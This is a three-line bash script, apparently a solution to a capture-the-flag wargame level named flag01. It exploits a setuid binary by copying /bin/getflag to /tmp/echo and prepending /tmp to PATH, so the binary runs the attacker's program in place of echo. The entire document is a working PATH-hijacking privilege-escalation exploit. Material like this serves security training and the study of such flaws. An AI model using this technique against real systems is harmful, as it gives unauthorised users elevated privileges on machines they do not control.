#!/usr/bin/env bash

cp -f /bin/getflag /tmp/echo

PATH="/tmp:$PATH" /home/flag01/flag01

rm -f /tmp/echo
